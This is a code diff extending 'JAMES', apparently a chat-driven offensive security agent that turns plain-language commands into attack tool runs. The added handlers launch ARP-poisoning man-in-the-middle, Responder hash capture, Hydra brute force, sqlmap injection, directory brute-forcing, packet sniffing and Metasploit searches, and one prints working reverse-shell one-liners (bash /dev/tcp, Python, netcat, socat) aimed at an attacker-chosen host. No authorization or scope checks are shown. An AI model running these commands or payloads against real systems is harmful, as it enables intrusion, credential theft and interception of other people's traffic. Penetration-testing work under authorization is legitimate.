@@ -43,12 +43,16 @@ class AgentPlan:
 # ── intent patterns ─────────────────────────────────────────────
 
 INTENT_PATTERNS = [
-    # Recon / scanning
-    (r"(?:scan|recon|enumerate|discover)\s+(.+)", "recon"),
+    # Recon / scanning (specific before generic)
+    (r"(?:masscan|mass\s*scan)\s+(.+)", "masscan"),
     (r"(?:quick\s*scan|fast\s*scan)\s+(.+)", "quick_recon"),
     (r"(?:full\s*scan|deep\s*scan|thorough\s*scan)\s+(.+)", "full_scan"),
     (r"(?:os\s*detect|fingerprint)\s+(.+)", "os_detect"),
     (r"(?:port\s*scan)\s+(.+)", "recon"),
+    (r"(?:ssl|tls)\s+(?:scan|check|audit)\s+(.+)", "ssl_scan"),
+    (r"(?:web\s*scan|nikto)\s+(.+)", "web_scan"),
+    (r"(?:waf|firewall)\s+(?:detect|check|scan)\s+(.+)", "waf_detect"),
+    (r"(?:scan|recon|enumerate|discover)\s+(.+)", "recon"),
 
     # Wi-Fi
     (r"(?:list|show)\s+(?:interfaces?|wifi|wlan|wireless)", "list_interfaces"),
@@ -58,9 +62,30 @@ INTENT_PATTERNS = [
     (r"(?:capture|sniff)\s+(?:handshake|packets?)\s+(?:on\s+)?(\S+)", "capture"),
     (r"(?:auto\s*pwn|autopwn|auto\s*hack|auto\s*crack)(?:\s+(\S+))?", "autopwn"),
 
+    # OSINT
+    (r"(?:osint|harvest|recon\s*domain|domain\s*recon)\s+(\S+)", "osint"),
+    (r"(?:whois)\s+(\S+)", "whois"),
+    (r"(?:dns\s*enum|dns\s*recon|dig)\s+(\S+)", "dns_enum"),
+
+    # Web (extras not already handled above)
+    (r"(?:gobuster|dir\s*brute|dir\s*bust)\s+(\S+)", "dir_brute"),
+    (r"(?:sqlmap|sql\s*inject(?:ion)?)\s+(\S+)", "sqli"),
+
+    # Network attacks
+    (r"(?:arp\s*spoof|arp\s*poison|mitm)\s+(\S+)(?:\s+(\S+))?", "mitm"),
+    (r"(?:responder|llmnr|nbt\s*poison)(?:\s+(\S+))?", "responder"),
+    (r"(?:sniff|capture\s*packets?|tcpdump|tshark)(?:\s+(\S+))?", "sniff"),
+
+    # Exploit
+    (r"(?:reverse\s*shell|rev\s*shell|listener)(?:\s+(\d+))?", "reverse_shell"),
+    (r"(?:msf|metasploit|msfconsole)(?:\s+(.+))?", "msf"),
+
     # Cracking
     (r"crack\s+(?:wpa|handshake|cap)\s+(\S+)(?:\s+(?:with|using)\s+(\S+))?", "crack_wpa"),
     (r"crack\s+(?:hash(?:es)?)\s+(\S+)(?:\s+(?:with|using)\s+(\S+))?", "crack_hash"),
+
+    # Brute force
+    (r"(?:brute\s*force|hydra|brute)\s+(\S+)(?:\s+(\S+))?", "brute"),
 
     # System
     (r"(?:system\s*check|check\s*tools?|status)", "system_check"),
@@ -69,6 +94,8 @@ INTENT_PATTERNS = [
     (r"set\s+(\w+)\s+(.+)", "set_context"),
     (r"(?:help|commands?|what\s+can)", "help"),
     (r"(?:history|log|task\s*log)", "show_log"),
+    (r"(?:report|generate\s*report|export\s*report)", "report"),
+    (r"(?:clear|reset)", "clear"),
 
     # Direct command passthrough
     (r"^!\s*(.+)", "shell"),
@@ -246,11 +273,13 @@ Respond ONLY with valid JSON. Do not include markdown formatting or extra text.
     # ── handlers ────────────────────────────────────────────────
 
     def _do_help(self, m, raw) -> str:
-        return """⚡ JAMES — Available Commands:
+        skill_count = len(self.orch.list_skills())
+        return f"""⚡ JAMES — Command Reference ({skill_count} skills loaded)
 
   🔍 Recon & Scanning
     scan <target>          Quick nmap scan
     full scan <target>     Deep service + script scan
+    masscan <target>       Ultra-fast full port scan (65535 ports)
     os detect <target>     OS fingerprinting (needs root)
 
   📡 Wi-Fi
@@ -258,31 +287,74 @@ Respond ONLY with valid JSON. Do not include markdown formatting or extra text.
     enable monitor [iface] Start monitor mode
     disable monitor [iface] Stop monitor mode
     deauth <BSSID> [count] Send deauth frames
-    autopwn [interface]    Full autonomous Wi-Fi crack (recon→target→deauth→capture→crack)
+    autopwn [interface]    Full autonomous Wi-Fi crack
+
+  🌐 Web & OSINT
+    osint <domain>         Harvest emails, subdomains, IPs
+    whois <domain>         Domain registration lookup
+    dns enum <domain>      DNS record enumeration
+    waf detect <url>       Detect web application firewall
+    ssl scan <target>      SSL/TLS security audit
+    nikto <url>            Web vulnerability scan
+    gobuster <url>         Directory brute-force
+    sqlmap <url>           SQL injection testing
+
+  🕸️ Network Attacks
+    mitm <victim> [gw]     ARP poisoning MITM
+    responder [interface]  LLMNR/NBT-NS hash capture
+    sniff [interface]      Packet capture & analysis
+    brute <target> [proto] Hydra brute-force
+
+  💣 Exploit
+    reverse shell [port]   Generate payloads + start listener
+    msf [search term]      Metasploit search/exploit
 
   🔓 Cracking
-    crack wpa <file> [wordlist]   Crack WPA handshake
-    crack hash <file> [wordlist]  Crack hash file
+    crack wpa <file>       Crack WPA handshake
+    crack hash <file>      Crack hash file (hashcat)
 
   ⚙️ System
-    status / system check  Check installed tools
-    list skills            Show available skill workflows
+    status                 Check all {skill_count}+ tools
+    list skills            Show {skill_count} skill workflows
     run skill <name>       Execute a skill workflow
+    report                 Generate session report
     history                Show task log
+    set <key> <value>      Set context variable
+    clear                  Reset session context
 
   💻 Shell
     ! <command>            Run a raw shell command
-    run <command>          Same as above
 
-  💡 Tips: I remember your last target and interface
-     across commands within this session."""
+  💡 Context: I remember target, interface, wordlist, etc."""
 
     def _do_system_check(self, m, raw) -> str:
         status = self.orch.system_check()
-        lines = ["⚙️ System Tool Status:\n"]
-        for tool, ok in status.items():
-            icon = "✅" if ok else "❌"
-            lines.append(f"  {icon}  {tool}")
+        installed = sum(1 for v in status.values() if v)
+        total = len(status)
+        lines = [f"⚙️ System Tool Status ({installed}/{total} installed):\n"]
+
+        categories = {
+            "Scanning": ["nmap", "masscan"],
+            "Wi-Fi": ["aircrack-ng", "airmon-ng", "airodump-ng", "aireplay-ng", "iwconfig",
+                       "reaver", "bully", "mdk4", "wifite", "hcxdumptool"],
+            "Cracking": ["hashcat", "john"],
+            "Brute-Force": ["hydra", "medusa", "ncrack"],
+            "Web": ["sqlmap", "nikto", "gobuster", "whatweb", "wafw00f", "sslscan"],
+            "OSINT": ["theHarvester"],
+            "Network": ["responder", "ettercap", "tcpdump", "tshark", "netcat", "socat",
+                        "arp-scan", "netdiscover"],
+            "SMB/AD": ["enum4linux", "smbclient"],
+            "Exploit": ["msfconsole"],
+        }
+
+        for cat, tools in categories.items():
+            cat_status = [(t, status.get(t, False)) for t in tools]
+            cat_ok = sum(1 for _, ok in cat_status if ok)
+            lines.append(f"\n  [{cat}] ({cat_ok}/{len(tools)})")
+            for tool, ok in cat_status:
+                icon = "✅" if ok else "❌"
+                lines.append(f"    {icon}  {tool}")
+
         return "\n".join(lines)
 
     def _do_recon(self, m, raw) -> str:
@@ -460,6 +532,236 @@ Respond ONLY with valid JSON. Do not include markdown formatting or extra text.
             output = output[:3000] + "\n... (truncated)"
         return f"$ {cmd}\n{output}" if output else f"$ {cmd}\n(no output)"
 
+    # ── new handlers ────────────────────────────────────────────
+
+    def _do_masscan(self, m, raw) -> str:
+        target = m.group(1).strip()
+        self.context["target"] = target
+        result = self.orch.masscan.scan(target, rate=1000)
+        if "error" in result:
+            return f"[!] Masscan failed: {result['error']}"
+        count = result.get("count", 0)
+        lines = [f"⚡ Masscan — {target} ({count} open ports)\n"]
+        for h in result.get("hosts", [])[:50]:
+            lines.append(f"  {h['ip']}:{h['port']}/{h['proto']}  {h['status']}")
+        if count > 50:
+            lines.append(f"\n  ... and {count - 50} more")
+        return "\n".join(lines)
+
+    def _do_osint(self, m, raw) -> str:
+        domain = m.group(1).strip()
+        self.context["domain"] = domain
+        self.context["target"] = domain
+        result = self.orch.harvester.harvest(domain)
+        lines = [f"🔎 OSINT — {domain}\n"]
+        lines.append(f"  📧 Emails found: {result['email_count']}")
+        for e in result.get("emails", [])[:15]:
+            lines.append(f"    • {e}")
+        lines.append(f"\n  🌐 Subdomains found: {result['subdomain_count']}")
+        for s in result.get("subdomains", [])[:15]:
+            lines.append(f"    • {s}")
+        if result.get("ips"):
+            lines.append(f"\n  🔢 IPs found: {len(result['ips'])}")
+            for ip in result["ips"][:10]:
+                lines.append(f"    • {ip}")
+        return "\n".join(lines)
+
+    def _do_whois(self, m, raw) -> str:
+        domain = m.group(1).strip()
+        result = self.orch.layer.run(f"whois {domain} | head -40", timeout=15)
+        return f"📋 WHOIS — {domain}\n\n{result.stdout[:2000]}"
+
+    def _do_dns_enum(self, m, raw) -> str:
+        domain = m.group(1).strip()
+        cmd = f"dig {domain} ANY +noall +answer && dig {domain} MX +noall +answer && dig {domain} NS +noall +answer"
+        result = self.orch.layer.run(cmd, timeout=15)
+        return f"🔍 DNS — {domain}\n\n{result.stdout[:2000]}"
+
+    def _do_waf_detect(self, m, raw) -> str:
+        url = m.group(1).strip()
+        result = self.orch.wafdetect.detect(url)
+        if result["waf_detected"]:
+            return f"🛡️ WAF Detected on {url}\n\n  Vendor: {result['waf_name']}"
+        return f"✅ No WAF detected on {url}"
+
+    def _do_ssl_scan(self, m, raw) -> str:
+        target = m.group(1).strip()
+        result = self.orch.sslscan.scan(target)
+        lines = [f"🔐 SSL/TLS Scan — {target}\n"]
+        lines.append(f"  Ciphers found: {result['ciphers_found']}")
+        if result.get("vulnerabilities"):
+            lines.append(f"\n  ⚠️ Vulnerabilities:")
+            for v in result["vulnerabilities"]:
+                lines.append(f"    ✕ {v}")
+        else:
+            lines.append("  ✅ No critical vulnerabilities found")
+        return "\n".join(lines)
+
+    def _do_web_scan(self, m, raw) -> str:
+        url = m.group(1).strip()
+        self.context["target_url"] = url
+        result = self.orch.layer.run(f"nikto -h {url} -maxtime 120s", timeout=130)
+        output = result.stdout[-2000:]
+        return f"🌐 Nikto Scan — {url}\n\n{output}"
+
+    def _do_dir_brute(self, m, raw) -> str:
+        url = m.group(1).strip()
+        self.context["target_url"] = url
+        result = self.orch.layer.run(
+            f"gobuster dir -u {url} -w /usr/share/wordlists/dirb/common.txt -t 20 --no-error -q",
+            timeout=180
+        )
+        return f"📂 Directory Scan — {url}\n\n{result.stdout[:2500]}"
+
+    def _do_sqli(self, m, raw) -> str:
+        url = m.group(1).strip()
+        self.context["target_url"] = url
+        result = self.orch.layer.run(
+            f"sqlmap -u '{url}' --batch --crawl=2 --level=2 --risk=1 --threads=5",
+            timeout=300
+        )
+        return f"💉 SQLMap — {url}\n\n{result.stdout[-2500:]}"
+
+    def _do_mitm(self, m, raw) -> str:
+        victim = m.group(1).strip()
+        gateway = m.group(2).strip() if m.group(2) else self.context.get("gateway")
+        iface = self.context.get("interface")
+        if not gateway:
+            return "[!] Need gateway. Use: mitm <victim> <gateway>\n    Or: set gateway 192.168.1.1"
+        if not iface:
+            return "[!] No interface set. Use: set interface eth0"
+        self.context["victim"] = victim
+        self.context["gateway"] = gateway
+
+        import threading
+        t = threading.Thread(
+            target=self.orch.ettercap.arp_poison,
+            args=(iface, victim, gateway),
+            kwargs={"timeout": 60},
+            daemon=True
+        )
+        t.start()
+        return (f"🕸️ MITM Attack Started\n"
+                f"  Victim:  {victim}\n"
+                f"  Gateway: {gateway}\n"
+                f"  Via:     {iface}\n\n"
+                f"  ARP poisoning active for 60s. Check Dashboard for output.")
+
+    def _do_responder(self, m, raw) -> str:
+        iface = m.group(1) if m.group(1) else self.context.get("interface")
+        if not iface:
+            return "[!] No interface specified. Use: responder <interface>"
+
+        import threading
+        t = threading.Thread(
+            target=self.orch.responder.start,
+            args=(iface,),
+            kwargs={"timeout": 60},
+            daemon=True
+        )
+        t.start()
+        return (f"🎣 Responder launched on {iface}\n"
+                f"  Poisoning LLMNR/NBT-NS/MDNS for 60s\n"
+                f"  Captured hashes will appear in Dashboard terminal.")
+
+    def _do_sniff(self, m, raw) -> str:
+        iface = m.group(1) if m.group(1) else self.context.get("interface")
+        if not iface:
+            return "[!] No interface specified. Use: sniff <interface>"
+        result = self.orch.layer.run(f"timeout 15 tcpdump -i {iface} -c 100 -nn 2>/dev/null", sudo=True, timeout=20)
+        return f"📡 Packet Capture — {iface} (100 packets)\n\n{result.stdout[:2500]}"
+
+    def _do_brute(self, m, raw) -> str:
+        target = m.group(1).strip()
+        proto = m.group(2).strip() if m.group(2) else "ssh"
+        username = self.context.get("username", "admin")
+        wordlist = self.context.get("wordlist", "/home/malcolm/Desktop/rockyou.txt")
+        self.context["target"] = target
+        result = self.orch.layer.run(
+            f"hydra -l {username} -P {wordlist} {target} {proto} -t 4 -f",
+            timeout=300
+        )
+        if "login:" in result.stdout:
+            return f"🔑 Hydra FOUND credentials!\n\n{result.stdout[-1000:]}"
+        return f"🔒 Hydra — no credentials found for {username}@{target} ({proto})\n\n{result.stdout[-500:]}"
+
+    def _do_reverse_shell(self, m, raw) -> str:
+        port = m.group(1) if m.group(1) else "4444"
+        lhost = self.context.get("lhost", "0.0.0.0")
+        self.context["lport"] = port
+        return (f"🐚 Reverse Shell Payloads (LHOST={lhost} LPORT={port})\n\n"
+                f"  [Bash]\n"
+                f"    bash -i >& /dev/tcp/{lhost}/{port} 0>&1\n\n"
+                f"  [Python]\n"
+                f"    python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{lhost}\",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'\n\n"
+                f"  [Netcat]\n"
+                f"    rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {port} >/tmp/f\n\n"
+                f"  [Socat]\n"
+                f"    socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:{lhost}:{port}\n\n"
+                f"  💡 Start listener: ! nc -nlvp {port}\n"
+                f"  💡 Set your IP: set lhost <your-ip>")
+
+    def _do_msf(self, m, raw) -> str:
+        query = m.group(1) if m.group(1) else ""
+        if query:
+            result = self.orch.layer.run(f"msfconsole -q -x 'search {query}; exit'", timeout=45)
+            return f"🔫 Metasploit Search: {query}\n\n{result.stdout[-2500:]}"
+        return ("🔫 Metasploit usage:\n"
+                "  msf <search term>    Search for exploits\n"
+                "  ! msfconsole         Launch interactive console\n"
+                "  run skill msf_exploit Run automated MSF skill")
+
+    def _do_report(self, m, raw) -> str:
+        log = self.orch.export_log()
+        if not log:
+            return "📋 No tasks to report."
+
+        from datetime import datetime
+        report = [f"# JAMES Penetration Test Report",
+                  f"Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n",
+                  f"## Session Context"]
+        for k, v in self.context.items():
+            report.append(f"- **{k}**: {v}")
+
+        report.append(f"\n## Task Log ({len(log)} entries)\n")
+        report.append("| Time | Action | Tool | Status |")
+        report.append("|------|--------|------|--------|")
+        for e in log:
+            report.append(f"| {e['timestamp'][:19]} | {e['action']} | {e['tool']} | {e['status']} |")
+
+        skills = self.orch.list_skills()
+        report.append(f"\n## Available Skills: {len(skills)}")
+        report.append(f"\n## Tools Status")
+        status = self.orch.system_check()
+        installed = sum(1 for v in status.values() if v)
+        report.append(f"- {installed}/{len(status)} tools installed")
+
+        report_text = "\n".join(report)
+        report_path = "/tmp/james_report.md"
+        with open(report_path, "w") as f:
+            f.write(report_text)
+
+        return (f"📋 Report generated ({len(log)} tasks logged)\n"
+                f"   Saved to: {report_path}\n\n"
+                f"   Context: {len(self.context)} variables set\n"
+                f"   Tools: {installed}/{len(status)} installed\n"
+                f"   Skills: {len(skills)} available")
+
+    def _do_clear(self, m, raw) -> str:
+        self.context.clear()
+        self.history.clear()
+        return "🔄 Session context and history cleared."
+
+    def _do_capture(self, m, raw) -> str:
+        iface = m.group(1) if m.group(1) else self.context.get("monitor_interface")
+        if not iface:
+            return "[!] No interface specified."
+        result = self.orch.layer.run(
+            f"timeout 30 airodump-ng {iface} --output-format csv -w /tmp/james_capture",
+            sudo=True, timeout=35
+        )
+        return f"📡 Capture on {iface} complete.\n  Output: /tmp/james_capture-01.csv"
+
     # ── helpers ─────────────────────────────────────────────────
 
     def _format_scan(self, result: dict, target: str, scan_type: str) -> str:
@@ -492,20 +794,28 @@ Respond ONLY with valid JSON. Do not include markdown formatting or extra text.
     def _suggest_next(self, hosts: list) -> str:
         suggestions = ["\n  💡 Suggested next steps:"]
         all_services = set()
+        all_ports = set()
         for h in hosts:
             for p in h.get("ports", []):
                 all_services.add(p.get("service", ""))
+                all_ports.add(str(p.get("port", "")))
 
         if "ssh" in all_services:
-            suggestions.append("    → SSH detected: try brute-force or check for weak keys")
-        if "http" in all_services or "https" in all_services:
-            suggestions.append("    → Web server found: consider running nikto or dirb")
-        if "smb" in all_services or "microsoft-ds" in all_services:
-            suggestions.append("    → SMB detected: try enum4linux or smbclient")
-        if "ftp" in all_services:
-            suggestions.append("    → FTP found: check for anonymous login")
+            suggestions.append("    → run skill brute_ssh       (SSH brute-force)")
+        if "http" in all_services or "https" in all_services or "80" in all_ports or "443" in all_ports:
+            suggestions.append("    → run skill full_web_audit   (nikto + gobuster + sqlmap)")
+            suggestions.append("    → waf detect <url>           (check for WAF)")
+        if "smb" in all_services or "microsoft-ds" in all_services or "445" in all_ports:
+            suggestions.append("    → run skill ad_domain_recon  (AD enumeration)")
+        if "ftp" in all_services or "21" in all_ports:
+            suggestions.append("    → run skill brute_ftp        (FTP brute-force)")
+        if "443" in all_ports:
+            suggestions.append("    → ssl scan <target>          (TLS audit)")
+        if "3306" in all_ports or "5432" in all_ports:
+            suggestions.append("    → run skill brute_multi      (multi-protocol brute)")
         if len(suggestions) == 1:
-            suggestions.append("    → Run 'full scan <target>' for deeper enumeration")
+            suggestions.append("    → full scan <target>         (deeper enumeration)")
+            suggestions.append("    → run skill vuln_scan        (vulnerability scan)")
         return "\n".join(suggestions)
 
     def _fallback(self, text: str) -> str:
@@ -514,8 +824,15 @@ Respond ONLY with valid JSON. Do not include markdown formatting or extra text.
             self.context["target"] = text
             return f"🎯 Target set: {text}\n    Try: scan {text}"
 
+        # Check if it looks like a domain
+        if re.match(r"^[a-z0-9-]+\.[a-z]{2,}", text, re.I):
+            self.context["domain"] = text
+            self.context["target"] = text
+            return f"🎯 Domain set: {text}\n    Try: osint {text}  or  scan {text}"
+
         return (
             f"🤔 I didn't understand: \"{text}\"\n\n"
             "    Type 'help' to see available commands.\n"
             "    Or use '! <command>' to run a shell command directly."
         )
+
